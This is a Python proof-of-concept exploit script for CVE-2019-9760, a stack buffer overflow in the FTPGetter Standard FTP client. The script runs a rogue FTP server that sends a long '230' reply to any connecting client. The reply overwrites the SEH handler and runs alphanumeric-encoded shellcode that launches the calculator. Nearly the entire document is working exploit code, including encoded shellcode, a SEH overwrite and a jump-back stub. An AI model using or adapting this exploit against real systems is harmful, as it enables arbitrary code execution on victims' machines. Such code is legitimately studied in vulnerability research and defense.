# Exploit Author:      https://github.com/w4fz5uck5
# Exploit finished:    08/03/2019
# Tested on:           Windows 7 x64 (Should work on new Windows versions too!)
# Vulnerable software: FTPGetter Standard v.5.97.0.177
# POC video:           https://vimeo.com/323501109
# CVE:                 CVE-2019-9760

import socket
import struct
import time
import sys

# badchars = (
#   "\x59\x5a\x5b\x5c\x0a\x0d\x20\x40\x1a\x80\x82\x83\x84\x85\x86\x87"
#   "\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
#   "\x9c\x9e\x9f\xc0\xc1"
#  )

# x86/alpha_mixed simple fixer -> bytes "\x89\xe3\xd9\xe1\xd9\x73\xf4"
calc =  ""                       
calc += "\x54"                   # push esp
calc += "\x58"                   # pop eax
calc += "\x05\x43\x06\x00\x00"   # add eax,0x643
calc += "\x50"                   # push eax
calc += "\x5f"                   # pop edi
calc += "\x25\x4A\x4D\x4E\x55"   # zerout EAX
calc += "\x25\x35\x32\x31\x2A"   # zerout EAX
calc += "\x04\xab"               # ADD AL,0xab
calc += "\x31\x07"               # XOR DWORD PTR DS:[EDI],EAX
calc += "\x31\x47\x01"           # XOR DWORD PTR DS:[EDI+1],EAX
calc += "\x31\x47\x02"           # XOR DWORD PTR DS:[EDI+2],EAX
calc += "\x2C\x5B"               # SUB AL,0x5b -> EAX = 0x50 
calc += "\x31\x47\x03"           # XOR DWORD PTR DS:[EDI+3],EAX
calc += "\x31\x47\x04"           # XOR DWORD PTR DS:[EDI+4],EAX
calc += "\x90\x90\x90\x90"       # padding

# "\x89\xe3"
calc += "\x54"                   # push esp
calc += "\x5b"                   # pop ebx

# "\xd9\xe1\xd9" xored: 0xab
calc += "\x72\x4a\x72"

# \x73\xf4 xored: 0x50
calc += "\x23\xa4"               

calc += "\x58\x50\x59\x49\x49\x49"
calc += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
calc += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
calc += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
calc += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
calc += "\x4a\x49\x58\x59\x48\x4b\x4f\x4e\x48\x39\x47\x53\x45"
calc += "\x37\x56\x51\x38\x59\x32\x54\x51\x34\x5a\x54\x51\x4a"
calc += "\x51\x39\x4f\x39\x58\x31\x45\x43\x56\x51\x53\x42\x35"
calc += "\x49\x4b\x33\x48\x42\x55\x54\x45\x53\x43\x42\x45\x45"
calc += "\x31\x4b\x58\x56\x50\x56\x4d\x33\x39\x59\x32\x51\x4a"
calc += "\x5a\x32\x42\x4b\x31\x4d\x32\x43\x45\x4b\x32\x44\x4b"
calc += "\x4e\x53\x4d\x31\x49\x50\x38\x59\x34\x4b\x55\x31\x49"
calc += "\x30\x54\x51\x5a\x47\x55\x53\x57\x31\x4d\x54\x53\x4c"
calc += "\x59\x4b\x49\x42\x49\x38\x4d\x4a\x5a\x37\x4f\x4a\x33"
calc += "\x58\x34\x50\x4b\x4b\x51\x4b\x5a\x48\x4e\x4d\x42\x50"
calc += "\x53\x4b\x46\x48\x4e\x53\x4b\x36\x35\x58\x42\x44\x4e"
calc += "\x4c\x30\x52\x54\x4e\x4c\x4d\x59\x4d\x46\x4d\x37\x4c"
calc += "\x37\x4c\x4f\x50\x4b\x4c\x4f\x4c\x4c\x42\x57\x53\x49"
calc += "\x38\x58\x57\x4d\x44\x32\x4e\x57\x53\x38\x59\x5a\x43"
calc += "\x33\x35\x49\x44\x43\x35\x4c\x32\x45\x4b\x5a\x49\x35"
calc += "\x59\x51\x4a\x35\x4c\x50\x39\x4f\x4d\x41\x41"

# Encode addresses and create jmp esp
# Calculate jmp esp offset and put it on stack
jump_back =  "\x55"                  # push ebp
jump_back += "\x58"                  # pop eax
jump_back += "\x05\x2b\x08\x00\x00"  # add eax,2091
jump_back += "\x50"                  # push eax

# zerout EAX
jump_back += "\x25\x4A\x4D\x4E\x55"  # and  eax, 0x554e4d4a
jump_back += "\x25\x35\x32\x31\x2A"  # and  eax, 0x2a313235

jump_back += "\x3E\x33\x04\x24"      # XOR EAX,DWORD PTR DS:[ESP] -> send stack addr to EAX
jump_back += "\x50"                  # push eax
jump_back += "\x5f"                  # pop edi

# zerout EAX
jump_back += "\x25\x4A\x4D\x4E\x55"  # and  eax, 0x554e4d4a
jump_back += "\x25\x35\x32\x31\x2A"  # and  eax, 0x2a313235

jump_back += "\x04\x81"              # ADD AL,0x81
jump_back += "\x31\x07"              # XOR DWORD PTR DS:[EDI],EAX
jump_back += "\x31\x47\x01"          # XOR DWORD PTR DS:[EDI+1],EAX
jump_back += "\x90\x90\x90\x90"      # padding

# Tool utilized: https://github.com/ihack4falafel/Slink
# All rights reserved to ihack4falafel
#
# \x54\x58\x66\x05\x04\x06\x50\xc3
jump_back += "\x25\x4A\x4D\x4E\x55"  # and  eax, 0x554e4d4a
jump_back += "\x25\x35\x32\x31\x2A"  # and  eax, 0x2a313235
jump_back += "\x05\x02\x03\x30\x62"  # add  eax, 0x62300302
jump_back += "\x05\x02\x03\x20\x61"  # add  eax, 0x61200302
jump_back += "\x50"                  # push eax
jump_back += "\x25\x4A\x4D\x4E\x55"  # and  eax, 0x554e4d4a
jump_back += "\x25\x35\x32\x31\x2A"  # and  eax, 0x2a313235
jump_back += "\x05\x32\x34\x33\x03"  # add  eax, 0x03333432
jump_back += "\x05\x22\x24\x33\x02"  # add  eax, 0x02332422
jump_back += "\x50"                  # push eax

jump_back += "\x7e\x65"                  # jmp esp xored: 0x81

# Overflow size 493
payload =  "\x90" * 29
payload += calc                          # shellcode 
payload += "\x90" * (493 - len(payload)) # padding
payload += "\x7e\x06\x90\x90"            # NSEH
payload += "\x31\x20\x77\x00"            # SEH -> POP ESI # POP EBX # RETN
payload += "\x90\x90\x90\x90"
payload += jump_back                     # jump to our calc 
payload += "\x90" * 700                  # Final padding

try:
    host, port = "0.0.0.0", 21
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, int(port)))
    s.listen(5)
    print "[*] Listening server at port: {}".format(port)
    print "[*] Waiting for the client!.."
    
except Exception as e:
    print "[-] Failed attempt to create bind socket!"
    print "[-] " + str(e)
    sys.exit(0)
    
try:
    conn, client = s.accept()
    conn.send("220 Welcome to server !\r\n")
    conn.recv(1024)
    
    print "[+] User started communication with server!"
    conn.send("331 anonymous OK!\r\n")
    conn.recv(1024)
    print "[+] Received anonymous user from the client!"
    
    print "[*] CALC shellcode Length: " + str(len(calc))
    print "[*] Jump Back shellcode Length: " + str(len(jump_back))
    print "[*] Payload final size: " + str(len(payload))
    print "[!] Attempting to send payload!..."
    conn.send("230 " + payload + "\r\n")

    time.sleep(1)
    print "[+] You should have your poped calc!"

    conn.close()
    s.close()
except Exception as e:
    print "[-] Failed attempt to send payload!"
    print "[-] " + str(e)
    sys.exit(0)
